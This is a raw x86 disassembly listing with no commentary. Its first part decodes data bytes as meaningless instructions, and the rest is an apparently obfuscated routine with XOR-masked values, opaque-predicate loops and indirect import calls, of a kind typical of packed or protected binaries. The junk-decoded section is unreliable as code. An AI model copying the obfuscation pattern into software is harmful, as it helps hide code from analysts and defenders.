  418ad5:	xchg   ebp,eax
  418ad6:	repz bound esp,QWORD PTR [esp+eiz*4]
  418ada:	jmp    0x67e4:0xda0996a4
  418ae1:	in     eax,dx
  418ae2:	xor    eax,0x806faa7b
  418ae7:	pop    DWORD PTR [edi+0x6b]
  418aea:	fdivr  st(1),st
  418aec:	dec    esp
  418aed:	pop    ss
  418aee:	push   ecx
  418aef:	das    
  418af0:	dec    esp
  418af1:	xor    al,BYTE PTR [eax+0x53c8dd49]
  418af7:	adc    bl,ah
  418af9:	js     0x418ab7
  418afb:	in     al,0x98
  418afd:	xor    DWORD PTR [edx],0x62
  418b00:	out    dx,al
  418b01:	xchg   ecx,eax
  418b02:	mov    ah,0xbc
  418b04:	test   BYTE PTR [ebp+edi*2-0x6667a4e6],ah
  418b0b:	out    0x5d,eax
  418b0d:	ffreep st(6)
  418b0f:	xor    BYTE PTR [ebp-0x7a],0xbd
  418b13:	pop    esi
  418b14:	aam    0xcb
  418b16:	inc    ebx
  418b17:	test   eax,0xc060be43
  418b1c:	adc    esi,DWORD PTR [eax+0x47a0c05f]
  418b22:	repnz fdiv DWORD PTR [edi]
  418b25:	sbb    BYTE PTR [ecx+0x14266fdc],dl
  418b2b:	jmp    0x52f0:0x9f177d66
  418b32:	adc    al,0xe3
  418b34:	out    0x31,eax
  418b36:	lahf   
  418b37:	dec    ebp
  418b38:	xchg   bl,al
  418b3a:	cs xor al,0xdf
  418b3d:	inc    ebx
  418b3e:	leave  
  418b3f:	jo     0x418ba2
  418b41:	call   0xdaa93225
  418b46:	ins    BYTE PTR es:[edi],dx
  418b47:	sti    
  418b48:	mov    ebx,0x11d6e416
  418b4d:	clc    
  418b4e:	daa    
  418b4f:	jle    0x418b97
  418b51:	call   DWORD PTR [esi-0xa]
  418b54:	mov    ds:0xd7a314cc,eax
  418b59:	das    
  418b5a:	das    
  418b5b:	cmp    bh,bh
  418b5d:	sbb    dh,bl
  418b5f:	test   eax,0x9ade1cbe
  418b64:	cmp    BYTE PTR [edx],0x3c
  418b67:	dec    edx
  418b68:	jb     0x418b9b
  418b6a:	pop    esp
  418b6b:	xchg   ecx,eax
  418b6c:	sbb    al,0xd9
  418b6e:	pop    eax
  418b6f:	out    dx,al
  418b70:	adc    edx,esi
  418b72:	lds    edx,FWORD PTR [ebx-0x1bf2e78d]
  418b78:	mov    cl,0xf0
  418b7a:	std    
  418b7b:	daa    
  418b7c:	in     eax,dx
  418b7d:	add    eax,0x60
  418b80:	cmp    ch,BYTE PTR [edi]
  418b82:	push   0x3a2768ef
  418b87:	sbb    al,0xf3
  418b89:	xchg   esi,eax
  418b8a:	sbb    edx,DWORD PTR [edi+0x1]
  418b8d:	cwde   
  418b8e:	jmp    0x418b7a
  418b90:	ja     0x418b3b
  418b92:	pop    ebp
  418b93:	xor    BYTE PTR [ebx+0x50],bh
  418b96:	call   0x76dc:0x723961e0
  418b9d:	test   eax,0xc43f6f51
  418ba2:	xchg   BYTE PTR [edx-0x6c],dh
  418ba5:	cmc    
  418ba6:	dec    ecx
  418ba7:	pop    ds
  418ba8:	es or  eax,0xfe14e6e1
  418bae:	lea    esp,[esi-0x69]
  418bb1:	lock push edi
  418bb3:	sub    DWORD PTR [edx+0x2495e60a],eax
  418bb9:	lahf   
  418bba:	leave  
  418bbb:	push   ebx
  418bbc:	les    eax,FWORD PTR [edi+0x44]
  418bbf:	cwde   
  418bc0:	jbe    0x418b6c
  418bc2:	xor    DWORD PTR [esi-0x37],esp
  418bc5:	aaa    
  418bc6:	aam    0x26
  418bc8:	rol    DWORD PTR ds:0x14e5e6a9,0x8e
  418bcf:	mov    ds:0x75b20ab4,eax
  418bd4:	cs ret 
  418bd6:	je     0x418b82
  418bd8:	sahf   
  418bd9:	inc    ebp
  418bda:	add    bl,ch
  418bdc:	mov    bl,0xf0
  418bde:	pusha  
  418bdf:	and    al,0xae
  418be1:	mul    DWORD PTR [edi+eax*2+0x43]
  418be5:	pop    esp
  418be6:	xor    al,0x29
  418be8:	adc    DWORD PTR [eax-0x4f],esp
  418beb:	lods   eax,DWORD PTR ds:[esi]
  418bec:	or     ah,BYTE PTR [edi]
  418bee:	ins    BYTE PTR es:[edi],dx
  418bef:	jmp    0x418b7c
  418bf1:	mov    ch,0x6d
  418bf3:	or     BYTE PTR [edx-0x4b04c5fb],0x4a
  418bfa:	mov    eax,ds:0xf257dfd1
  418bff:	jmp    0x418b83
  418c01:	push   ebx
  418c02:	mov    ch,0xc9
  418c04:	dec    ebx
  418c05:	retf   
  418c06:	in     al,dx
  418c07:	pop    ss
  418c08:	out    dx,eax
  418c09:	icebp  
  418c0a:	arpl   WORD PTR [edx+0x1e56c4db],bp
  418c10:	cwde   
  418c11:	ret    0x2ff5
  418c14:	(bad)  
  418c15:	jo     0x418c47
  418c17:	mov    ds:0xe0c9116a,eax
  418c1c:	mov    ds,WORD PTR [eax+0x56340342]
  418c22:	bound  eax,QWORD PTR [eax-0x2f]
  418c25:	daa    
  418c26:	test   al,0x6c
  418c28:	adc    eax,0xdc0f72af
  418c2d:	icebp  
  418c2e:	cwde   
  418c2f:	add    DWORD PTR ds:0x13bb8e45,esi
  418c35:	frstor [edi+0x2c5f1d91]
  418c3b:	dec    edi
  418c3c:	ds jne 0x418c91
  418c3f:	fdivr  st,st(5)
  418c41:	sub    al,0x1a
  418c43:	adc    BYTE PTR [edx],cl
  418c45:	adc    al,0xe6
  418c47:	scas   al,BYTE PTR es:[edi]
  418c48:	test   DWORD PTR [edi+0xb8c1c75],edx
  418c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c4f:	call   0xbc34216
  418c54:	scas   al,BYTE PTR es:[edi]
  418c55:	dec    edi
  418c56:	ds inc edi
  418c58:	(bad)  
  418c5a:	push   0x33ab41d5
  418c5f:	aad    0xce
  418c61:	push   ebp
  418c62:	not    DWORD PTR [esi-0x1cd7ce93]
  418c68:	pop    ecx
  418c69:	mov    al,ds:0x84a6a18b
  418c6e:	xor    al,0x13
  418c70:	popa   
  418c71:	shr    BYTE PTR [eax-0x19],0x29
  418c75:	push   ecx
  418c76:	mov    ebx,0xc280072
  418c7b:	in     al,dx
  418c7c:	(bad)  
  418c7d:	pusha  
  418c7e:	cmp    BYTE PTR [ecx-0x15],al
  418c81:	lock jmp 0xb4ba:0x6ff1fb46
  418c89:	mov    DWORD PTR [ebx-0x1a],edi
  418c8c:	inc    ebp
  418c8d:	aad    0xd6
  418c8f:	push   esi
  418c90:	add    eax,0x8314d18b
  418c95:	packuswb mm7,QWORD PTR [edx-0x6a]
  418c99:	sbb    eax,0xb87d8fa5
  418c9e:	pop    ebx
  418c9f:	dec    edx
  418ca0:	stos   BYTE PTR es:[edi],al
  418ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ca2:	fbld   TBYTE PTR [ebx-0x5f]
  418ca5:	bound  edx,QWORD PTR [edx-0x74]
  418ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ca9:	xchg   BYTE PTR [edi],ah
  418cab:	jmp    0x78fd:0xe6b986f6
  418cb2:	or     esi,eax
  418cb4:	dec    esp
  418cb5:	jae    0x418c5c
  418cb7:	(bad)  
  418cb9:	loop   0x418c43
  418cbb:	mov    ?,WORD PTR [edx+ecx*1-0x76]
  418cbf:	jl     0x418d35
  418cc1:	sub    DWORD PTR [ebp+0x4336fe60],eax
  418cc7:	repnz daa 
  418cc9:	ins    BYTE PTR es:[edi],dx
  418cca:	mov    bh,0xfc
  418ccc:	mov    ecx,0x171700cc
  418cd1:	or     BYTE PTR [edx],0x2b
  418cd4:	mov    edx,0xc8309944
  418cd9:	ret    
  418cda:	aas    
  418cdb:	iret   
  418cdc:	leave  
  418cdd:	popa   
  418cde:	xchg   BYTE PTR [eax-0x10],bh
  418ce1:	loope  0x418c9e
  418ce3:	repz cld 
  418ce5:	pusha  
  418ce6:	jmp    0x418c9b
  418ce8:	xor    ebp,DWORD PTR [edi+0x6d]
  418ceb:	blsfill ebp,DWORD PTR [eax]
  418cf0:	mov    ds,WORD PTR [ebx-0x1a]
  418cf3:	push   eax
  418cf4:	mov    ch,BYTE PTR [ecx-0x3fbe5361]
  418cfa:	dec    ecx
  418cfb:	mov    esi,DWORD PTR [ecx]
  418cfd:	scas   eax,DWORD PTR es:[edi]
  418cfe:	mov    dh,0xec
  418d00:	dec    esi
  418d01:	outs   dx,DWORD PTR ds:[esi]
  418d02:	cs inc edx
  418d04:	or     BYTE PTR [edi+0x3f709ac6],dh
  418d0a:	mov    cs,WORD PTR [edx+0x1ea23f21]
  418d10:	pop    edx
  418d11:	xor    eax,0x41b2db51
  418d16:	rol    DWORD PTR [ecx-0x1a],0x27
  418d1a:	aaa    
  418d1b:	push   edi
  418d1c:	pop    ecx
  418d1d:	out    0x99,eax
  418d1f:	inc    ebp
  418d20:	inc    esp
  418d21:	aad    0x3c
  418d23:	and    DWORD PTR [eax-0x42],0x13
  418d27:	cld    
  418d28:	pop    ebp
  418d29:	aam    0xac
  418d2b:	sbb    DWORD PTR [ecx],eax
  418d2d:	repnz jmp 0x577a:0x4c0a1b0d
  418d35:	dec    esp
  418d36:	mov    cs,ebp
  418d38:	sti    
  418d39:	loop   0x418d1b
  418d3b:	imul   esi,ebp,0x46f97c8f
  418d41:	clc    
  418d42:	dec    esi
  418d43:	sub    al,BYTE PTR [ebx+0x5]
  418d46:	lods   al,BYTE PTR ds:[esi]
  418d47:	lahf   
  418d48:	pop    ds
  418d49:	mov    eax,0x92d16c5e
  418d4e:	xlat   BYTE PTR ds:[ebx]
  418d4f:	jo     0x418d32
  418d51:	inc    esp
  418d52:	sbb    ch,BYTE PTR [esi-0x1134c165]
  418d58:	mov    ah,0xb0
  418d5a:	bound  eax,QWORD PTR [esi]
  418d5c:	mov    eax,cs
  418d5e:	sub    al,0x74
  418d60:	leave  
  418d61:	push   ds
  418d62:	dec    edx
  418d63:	cmc    
  418d64:	(bad)  
  418d65:	or     eax,0x4d157f0b
  418d6a:	sbb    al,0x1d
  418d6c:	retf   
  418d6d:	mov    bl,0xbd
  418d6f:	out    0xd0,eax
  418d71:	mov    dl,0xe1
  418d73:	adc    al,0xf0
  418d75:	test   eax,0x4c13c4c3
  418d7a:	pop    es
  418d7b:	loope  0x418dbf
  418d7d:	xchg   edi,eax
  418d7e:	cmp    ch,BYTE PTR [eax+0x2d]
  418d81:	fmul   QWORD PTR [esi]
  418d83:	cli    
  418d84:	dec    edi
  418d85:	or     al,0xfa
  418d87:	ficom  DWORD PTR [edx-0x35]
  418d8a:	jnp    0x418d0d
  418d8c:	(bad)  
  418d8e:	mov    al,al
  418d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d91:	and    al,0xbb
  418d93:	scas   al,BYTE PTR es:[edi]
  418d94:	pop    eax
  418d95:	and    al,BYTE PTR [ebp+0x2bb1e93]
  418d9b:	popf   
  418d9c:	fiadd  WORD PTR [edi-0x6c]
  418d9f:	adc    edi,DWORD PTR ds:0xe518c598
  418da5:	std    
  418da6:	jl     0x418dfe
  418da8:	mov    fs,WORD PTR [esi]
  418daa:	or     bh,BYTE PTR [ecx-0x5f]
  418dad:	dec    esp
  418dae:	adc    dl,BYTE PTR [eax+0x6]
  418db1:	aas    
  418db2:	mov    BYTE PTR ds:0x8fef165a,0x36
  418db9:	cli    
  418dba:	add    eax,0x61ac662a
  418dbf:	add    al,0xd6
  418dc1:	adc    DWORD PTR [ebp+0x4],eax
  418dc4:	xchg   ecx,eax
  418dc5:	xor    BYTE PTR [ecx+edx*2-0x3b00fe0a],0xe4
  418dcd:	loopne 0x418d67
  418dcf:	inc    edx
  418dd0:	pop    eax
  418dd1:	(bad)  
  418dd2:	in     eax,dx
  418dd3:	test   eax,0x8610bcdb
  418dd8:	gs dec edx
  418dda:	mov    bl,BYTE PTR [edi+0x1b1e8a49]
  418de0:	mov    ah,0x1a
  418de2:	ins    DWORD PTR es:[edi],dx
  418de3:	out    0xeb,al
  418de5:	jmp    0x418d6b
  418de7:	aam    0x15
  418de9:	or     eax,0x36e142a7
  418dee:	loope  0x418daf
  418df0:	add    al,0xe6
  418df2:	cld    
  418df3:	mov    esi,gs
  418df5:	sbb    eax,0x359e34b4
  418dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dfb:	dec    edx
  418dfc:	cmp    al,0x4e
  418dfe:	jno    0x418e2f
  418e00:	enter  0xe791,0x6f
  418e04:	not    BYTE PTR [esi+ebx*4+0x558bc499]
  418e0b:	lock or DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42a9cf
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42a9d3
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
